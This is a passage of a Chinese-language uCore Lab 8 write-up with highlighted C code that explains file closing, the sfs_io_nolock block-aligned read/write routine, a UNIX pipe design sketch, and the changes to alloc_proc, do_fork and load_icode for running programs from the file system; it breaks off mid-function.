<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// close file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_close</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = fd2file(fd, &amp;file)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    fd_array_close(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<code>fd_array_close</code>函数中，如果该文件的打开次数为0，则调用<code>fd_array_free</code>将该文件所占用的资源释放</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fd_array_close - file's open_count--; if file's open_count-- == 0 , then call fd_array_free to free this file item</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">fd_array_close(struct file *file) &#123;</span><br><span class="line">    assert(file-&gt;status == FD_OPENED);</span><br><span class="line">    assert(fopen_count(file) &gt; <span class="number">0</span>);</span><br><span class="line">    file-&gt;status = FD_CLOSED;</span><br><span class="line">    <span class="keyword">if</span> (fopen_count_dec(file) == <span class="number">0</span>) &#123;</span><br><span class="line">        fd_array_free(file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>而<code>fd_array_free</code>函数会进一步调用<code>vfs_close</code>。并在内部调用<code>inode_ref_dec</code>和<code>inode_open_dec</code>以递减该文件的引用次数和打开次数。</p>
<ul>
<li>当<strong>引用次数</strong>递减为0时，<code>inode_ref_dec</code>内部会调用<code>vop_reclaim</code>（即<code>sfs_reclaim</code>）来释放对应<code>inode</code>结构所涉及的所有数据。</li>
<li>当<strong>打开次数</strong>递减为0时，<code>inode_open_dec</code>内部会调用<code>vop_close</code>（即<code>sfs_close</code>）来将相关<code>inode</code>写入至磁盘中，并释放结构。</li>
</ul>
<blockquote>
<p>这两个函数对inode的操作稍微有一点点差别，请结合源代码详细理解。</p>
</blockquote>
<blockquote>
<p>不再详细向下写了，内容太多实在写不完了。。。。</p>
</blockquote>
</li>
</ul>
<h2 id="练习解答">练习解答</h2>
<h3 id="0-练习0">0) 练习0</h3>
<blockquote>
<p>填写已有实验</p>
</blockquote>
<p>本次的练习0无需修改其他代码，只要把原先的地方填入lab8代码中即可。</p>
<h3 id="1-练习1">1) 练习1</h3>
<blockquote>
<p><strong>完成读文件操作的实现</strong></p>
<p>首先了解打开文件的处理流程，然后参考本实验后续的文件读写操作的过程分析，编写在sfs_inode.c中sfs_io_nolock读文件中数据的实现代码。</p>
</blockquote>
<p>文件的处理流程请阅读上文<a href="#9-uCore%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0">uCore文件系统实现</a></p>
<p>当进行文件读取/写入操作时，最终uCore都会执行到<code>sfs_io_nolock</code>函数。在该函数中，我们要完成对设备上基础块数据的读取与写入。</p>
<p>在进行读取/写入前，我们需要先将数据与基础块对齐，以便于使用<code>sfs_block_op</code>函数来操作基础块，提高读取/写入效率。</p>
<p>但一旦将数据对齐后会存在一个问题：</p>
<ul>
<li>
<p>待操作数据的前一小部分有可能在最前的一个基础块的末尾位置</p>
</li>
<li>
<p>待操作数据的后一小部分有可能在最后的一个基础块的起始位置</p>
</li>
</ul>
<p>我们需要分别对这<strong>第一</strong>和<strong>最后</strong>这两个位置的基础块进行读写/写入，因为<strong>这两个位置的基础块所涉及到的数据都是部分的</strong>。而中间的数据由于已经对齐好基础块了，所以可以直接调用<code>sfs_block_op</code>来读取/写入数据。以下是相关操作的实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * sfs_io_nolock - Rd/Wr a file contentfrom offset position to offset+ length  disk blocks&lt;--&gt;buffer (in memroy)</span></span><br><span class="line"><span class="comment"> * @sfs:      sfs file system</span></span><br><span class="line"><span class="comment"> * @sin:      sfs inode in memory</span></span><br><span class="line"><span class="comment"> * @buf:      the buffer Rd/Wr</span></span><br><span class="line"><span class="comment"> * @offset:   the offset of file</span></span><br><span class="line"><span class="comment"> * @alenp:    the length need to read (is a pointer). and will RETURN the really Rd/Wr lenght</span></span><br><span class="line"><span class="comment"> * @write:    BOOL, 0 read, 1 write</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_io_nolock(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">void</span> *buf, <span class="keyword">off_t</span> offset, <span class="keyword">size_t</span> *alenp, <span class="keyword">bool</span> write) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span> = <span class="title">sin</span>-&gt;<span class="title">din</span>;</span></span><br><span class="line">    assert(din-&gt;type != SFS_TYPE_DIR);</span><br><span class="line">  <span class="comment">// calculate the Rd/Wr end position</span></span><br><span class="line">    <span class="comment">// 计算缓冲区读取/写入的终止位置</span></span><br><span class="line">    <span class="keyword">off_t</span> endpos = offset + *alenp, blkoff;</span><br><span class="line">    *alenp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt;= SFS_MAX_FILE_SIZE || offset &gt; endpos)</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    <span class="comment">// 如果偏移与终止位置相同，及欲读取/写入0字节的数据</span></span><br><span class="line">    <span class="keyword">if</span> (offset == endpos) &#123;</span><br><span class="line">        <span class="comment">// 直接返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (endpos &gt; SFS_MAX_FILE_SIZE)</span><br><span class="line">        endpos = SFS_MAX_FILE_SIZE;</span><br><span class="line">    <span class="keyword">if</span> (!write) &#123;</span><br><span class="line">        <span class="comment">// 如果是读取数据，并冲区中剩余的数据超出一个硬盘节点的数据大小</span></span><br><span class="line">        <span class="keyword">if</span> (offset &gt;= din-&gt;size) &#123;</span><br><span class="line">            <span class="comment">// 直接返回，读取失败</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (endpos &gt; din-&gt;size)</span><br><span class="line">            endpos = din-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据不同的执行函数，设置对应的函数指针</span></span><br><span class="line">    <span class="keyword">int</span> (*sfs_buf_op)(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">uint32_t</span> blkno, <span class="keyword">off_t</span> offset);</span><br><span class="line">    <span class="keyword">int</span> (*sfs_block_op)(struct sfs_fs *sfs, <span class="keyword">void</span> *buf, <span class="keyword">uint32_t</span> blkno, <span class="keyword">uint32_t</span> nblks);</span><br><span class="line">    <span class="keyword">if</span> (write)</span><br><span class="line">        sfs_buf_op = sfs_wbuf, sfs_block_op = sfs_wblock;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        sfs_buf_op = sfs_rbuf, sfs_block_op = sfs_rblock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> size, alen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> ino;</span><br><span class="line">    <span class="keyword">uint32_t</span> blkno = offset / SFS_BLKSIZE;          <span class="comment">// The NO. of Rd/Wr begin block</span></span><br><span class="line">    <span class="keyword">uint32_t</span> nblks = endpos / SFS_BLKSIZE - blkno;  <span class="comment">// The size of Rd/Wr blocks</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//LAB8:EXERCISE1 YOUR CODE HINT: call sfs_bmap_load_nolock, sfs_rbuf, sfs_rblock,etc. read different kind of blocks in file</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * (1) If offset isn't aligned with the first block, Rd/Wr some content from offset to the end of the first block</span></span><br><span class="line"><span class="comment">   *       NOTICE: useful function: sfs_bmap_load_nolock, sfs_buf_op</span></span><br><span class="line"><span class="comment">   *               Rd/Wr size = (nblks != 0) ? (SFS_BLKSIZE - blkoff) : (endpos - offset)</span></span><br><span class="line"><span class="comment">   * (2) Rd/Wr aligned blocks</span></span><br><span class="line"><span class="comment">   *       NOTICE: useful function: sfs_bmap_load_nolock, sfs_block_op</span></span><br><span class="line"><span class="comment">     * (3) If end position isn't aligned with the last block, Rd/Wr some content from begin to the (endpos % SFS_BLKSIZE) of the last block</span></span><br><span class="line"><span class="comment">   *       NOTICE: useful function: sfs_bmap_load_nolock, sfs_buf_op</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    <span class="comment">// 对齐偏移。如果偏移没有对齐第一个基础块，则多读取/写入第一个基础块的末尾数据</span></span><br><span class="line">    <span class="keyword">if</span> ((blkoff = offset % SFS_BLKSIZE) != <span class="number">0</span>) &#123;</span><br><span class="line">        size = (nblks != <span class="number">0</span>) ? (SFS_BLKSIZE - blkoff) : (endpos - offset);</span><br><span class="line">        <span class="comment">// 获取第一个基础块所对应的block的编号`ino`</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">// 通过上一步取出的`ino`，读取/写入一部分第一个基础块的末尾数据</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, blkoff)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        alen += size;</span><br><span class="line">        <span class="keyword">if</span> (nblks == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        buf += size, blkno ++, nblks --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 循环读取/写入对齐好的数据</span></span><br><span class="line">    size = SFS_BLKSIZE;</span><br><span class="line">    <span class="keyword">while</span> (nblks != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取inode对应的基础块编号</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="comment">// 单次读取/写入一基础块的数据</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_block_op(sfs, buf, ino, <span class="number">1</span>)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        alen += size, buf += size, blkno ++, nblks --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果末尾位置没有与最后一个基础块对齐，则多读取/写入一点末尾基础块的数据</span></span><br><span class="line">    <span class="keyword">if</span> ((size = endpos % SFS_BLKSIZE) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, <span class="built_in">sin</span>, blkno, &amp;ino)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, <span class="number">0</span>)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        alen += size;</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    *alenp = alen;</span><br><span class="line">    <span class="keyword">if</span> (offset + alen &gt; <span class="built_in">sin</span>-&gt;din-&gt;size) &#123;</span><br><span class="line">        <span class="built_in">sin</span>-&gt;din-&gt;size = offset + alen;</span><br><span class="line">        <span class="built_in">sin</span>-&gt;dirty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>给出设计实现”UNIX的PIPE机制“的概要设方案</p>
</blockquote>
<ul>
<li>PIPE管道机制是进程间通信的较为重要的一种方式。在VFS中，最简单的做法就是在磁盘上建立一块pipe缓冲文件<code>pipe_tmp</code>。之后，当打开了<code>pipe_tmp</code>文件的某进程fork出子进程后，父子进程就可以通过读写同一文件来实现进程间通信。</li>
<li>但实际上，上述的进程间通信是十分低效的，因为需要调用多个函数来完成文件读写，同时硬盘的读写速率也远远小于内存。由于用户与实际的文件系统间由虚拟文件系统VFS调控，因此我们可以在内存中根据文件系统规范，建立虚拟pipe缓冲区域文件来代替磁盘上的缓冲文件，这样便可大大提高通信速率。</li>
</ul>
<h3 id="2-练习2">2) 练习2</h3>
<blockquote>
<p><strong>完成基于文件系统的执行程序机制的实现</strong></p>
</blockquote>
<p>基于文件系统的执行程序机制，有几部分地方需要添加代码，分别是<code>alloc_proc</code>、<code>do_fork</code>、<code>load_icode</code>三个函数。</p>
<ul>
<li>
<p><code>alloc_proc</code></p>
<ul>
<li>
<p>这个函数需要添加的内容最少，只需多补充一个<code>struct files_struct *filesp</code>的初始化即可</p>
</li>
<li>
<p>修改后的源码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">alloc_proc</span>(<span class="title">void</span>) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> = <span class="title">kmalloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">proc_struct</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// Lab7内容</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//LAB8:EXERCISE2 YOUR CODE HINT:need add some code to init fs in proc_struct, ...</span></span><br><span class="line">        <span class="comment">// LAB8 添加一个filesp指针的初始化</span></span><br><span class="line">        proc-&gt;filesp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>do_fork</code></p>
<ul>
<li>
<p>fork机制在原先lab7的基础上，多了<code>file_struct</code>结构的复制操作与执行失败时的重置操作。</p>
<p>这两部操作分别需要调用<code>copy_files</code>和<code>put_files</code>函数</p>
</li>
<li>
<p>修改后的源码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">do_fork(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    proc-&gt;parent = current;</span><br><span class="line">    assert(current-&gt;wait_state == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//LAB8:EXERCISE2 YOUR CODE  HINT:how to copy the fs in parent's proc_struct?</span></span><br><span class="line">    <span class="comment">// LAB8 将当前进程的fs复制到fork出的进程中</span></span><br><span class="line">    <span class="keyword">if</span> (copy_files(clone_flags, proc) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_fs;</span><br><span class="line">    &#125;</span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid = get_pid();</span><br><span class="line">        hash_proc(proc);</span><br><span class="line">        set_links(proc);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    wakeup_proc(proc);</span><br><span class="line"></span><br><span class="line">    ret = proc-&gt;pid;</span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  <span class="comment">// LAB8 如果复制失败，则需要重置原先的操作</span></span><br><span class="line">bad_fork_cleanup_fs:  <span class="comment">//for LAB8</span></span><br><span class="line">    put_files(proc);</span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>load_icode</code>函数可以在lab7原先的基础上进行修改，不需要从0开发。</p>
<ul>
<li>
<p>原先lab7源码中，读取可执行文件是直接读取内存的，但在这里需要使用函数<code>load_icode_read</code>来从文件系统中读取<code>ELF header</code>以及各个段的数据。</p>
</li>
<li>
<p>原先Lab7的<code>load_icode</code>函数中并没有对<code>execve</code>所执行的程序传入参数，而我们需要在lab8中补充这个实现。</p>
</li>
<li>
<p>补充后的源码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// load_icode -  called by sys_exec--&gt;do_execve</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">load_icode(<span class="keyword">int</span> fd, <span class="keyword">int</span> argc, <span class="keyword">char</span> **kargv) &#123;</span><br><span class="line">    <span class="comment">/* LAB8:EXERCISE2 YOUR CODE  HINT:how to load the file with handler fd  in to process's memory? how to setup argc/argv?</span></span><br><span class="line"><span class="comment">     * MACROs or Functions:</span></span><br><span class="line"><span class="comment">     *  mm_create        - create a mm</span></span><br><span class="line"><span class="comment">     *  setup_pgdir      - setup pgdir in mm</span></span><br><span class="line"><span class="comment">     *  load_icode_read  - read raw data content of program file</span></span><br><span class="line"><span class="comment">     *  mm_map           - build new vma</span></span><br><span class="line"><span class="comment">     *  pgdir_alloc_page - allocate new memory for  TEXT/DATA/BSS/stack parts</span></span><br><span class="line"><span class="comment">     *  lcr3             - update Page Directory Addr Register -- CR3</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="comment">/* (1) create a new mm for current process</span></span><br><span class="line"><span class="comment">     * (2) create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT</span></span><br><span class="line"><span class="comment">     * (3) copy TEXT/DATA/BSS parts in binary to memory space of process</span></span><br><span class="line"><span class="comment">     *    (3.1) read raw data content in file and resolve elfhdr</span></span><br><span class="line"><span class="comment">     *    (3.2) read raw data content in file and resolve proghdr based on info in elfhdr</span></span><br><span class="line"><span class="comment">     *    (3.3) call mm_map to build vma related to TEXT/DATA</span></span><br><span class="line"><span class="comment">     *    (3.4) callpgdir_alloc_page to allocate page for TEXT/DATA, read contents in file</span></span><br><span class="line"><span class="comment">     *          and copy them into the new allocated pages</span></span><br><span class="line"><span class="comment">     *    (3.5) callpgdir_alloc_page to allocate pages for BSS, memset zero in these pages</span></span><br><span class="line"><span class="comment">     * (4) call mm_map to setup user stack, and put parameters into user stack</span></span><br><span class="line"><span class="comment">     * (5) setup current process's mm, cr3, reset pgidr (using lcr3 MARCO)</span></span><br><span class="line"><span class="comment">     * (6) setup uargc and uargv in user stacks</span></span><br><span class="line"><span class="comment">     * (7) setup trapframe for user environment</span></span><br><span class="line"><span class="comment">     * (8) if up steps failed, you should cleanup the env.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    assert(argc &gt;= <span class="number">0</span> &amp;&amp; argc &lt;= EXEC_MAX_ARG_NUM);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        panic(<span class="string">"load_icode: current-&gt;mm must be empty.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_MEM;</span><br><span class="line">    <span class="comment">// 创建proc的内存管理结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((mm = mm_create()) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_mm;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (setup_pgdir(mm) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_pgdir_cleanup_mm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="comment">// LAB8 这里要从文件中读取ELF header，而不是Lab7中的内存了</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> __<span class="title">elf</span>, *<span class="title">elf</span> = &amp;__<span class="title">elf</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = load_icode_read(fd, elf, <span class="keyword">sizeof</span>(struct elfhdr), <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_elf_cleanup_pgdir;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断读取入的elf header是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123;</span><br><span class="line">        ret = -E_INVAL_ELF;</span><br><span class="line">        <span class="keyword">goto</span> bad_elf_cleanup_pgdir;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据每一段的大小和基地址来分配不同的内存空间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> __<span class="title">ph</span>, *<span class="title">ph</span> = &amp;__<span class="title">ph</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags, perm, phnum;</span><br><span class="line">    <span class="keyword">for</span> (phnum = <span class="number">0</span>; phnum &lt; elf-&gt;e_phnum; phnum ++) &#123;</span><br><span class="line">        <span class="comment">// LAB8 从文件特定偏移处读取每个段的详细信息（包括大小、基地址等等）</span></span><br><span class="line">        <span class="keyword">off_t</span> phoff = elf-&gt;e_phoff + <span class="keyword">sizeof</span>(struct proghdr) * phnum;</span><br><span class="line">        <span class="keyword">if</span> ((ret = load_icode_read(fd, ph, <span class="keyword">sizeof</span>(struct proghdr), phoff)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD) &#123;</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) &#123;</span><br><span class="line">            ret = -E_INVAL_ELF;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        vm_flags = <span class="number">0</span>, perm = PTE_U;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;</span><br><span class="line">        <span class="keyword">if</span> (vm_flags &amp; VM_WRITE) perm |= PTE_W;</span><br><span class="line">        <span class="comment">// 为当前段分配内存空间</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">off_t</span> offset = ph-&gt;p_offset;</span><br><span class="line">        <span class="keyword">size_t</span> off, size;</span><br><span class="line">        <span class="keyword">uintptr_t</span> start = ph-&gt;p_va, end, la = ROUNDDOWN(start, PGSIZE);</span><br><span class="line"></span><br><span class="line">        ret = -E_NO_MEM;</span><br><span class="line"></span><br><span class="line">        end = ph-&gt;p_va + ph-&gt;p_filesz;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            <span class="comment">// 设置该内存所对应的页表项</span></span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                ret = -E_NO_MEM;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la, size = PGSIZE - off, la += PGSIZE;</span><br><span class="line">            <span class="keyword">if</span> (end &lt; la) &#123;</span><br><span class="line">                size -= la - end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// LAB8 读取elf对应段内的数据并写入至该内存中</span></span><br><span class="line">            <span class="keyword">if</span> ((ret = load_icode_read(fd, page2kva(page) + off, size, offset)) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            start += size, offset += size;</span><br><span class="line">        &#125;</span><br><span class="line">        end = ph-&gt;p_va + ph-&gt;p_memsz;</span><br><span class="line">        <span class="comment">// 对于段中当前页中剩余的空间（复制elf数据后剩下的空间），将其置为0</span></span><br><span class="line">        <span class="keyword">if</span> (start &lt; la) &#123;</span><br><span class="line">            <span class="comment">/* ph-&gt;p_memsz == ph-&gt;p_filesz */</span></span><br><span class="line">            <span class="keyword">if</span> (start == end) &#123;</span><br><span class="line">                <span class="keyword">continue</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start + PGSIZE - la, size = PGSIZE - off;</span><br><span class="line">            <span class="keyword">if</span> (end &lt; la) &#123;</span><br><span class="line">                size -= la - end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, size);</span><br><span class="line">            start += size;</span><br><span class="line">            assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 对于段中剩余页中的空间（复制elf数据后的多余页面），将其置为0</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                ret = -E_NO_MEM;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la, size = PGSIZE - off, la += PGSIZE;</span><br><span class="line">            <span class="keyword">if</span> (end &lt; la) &#123;</span><br><span class="line">                size -= la - end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, size);</span><br><span class="line">            start += size;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 关闭读取的ELF</span></span><br><span class="line">    sysfile_close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置栈内存</span></span><br><span class="line">    vm_flags = VM_READ | VM_WRITE | VM_STACK;</span><br><span class="line">    <span class="keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-2</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, 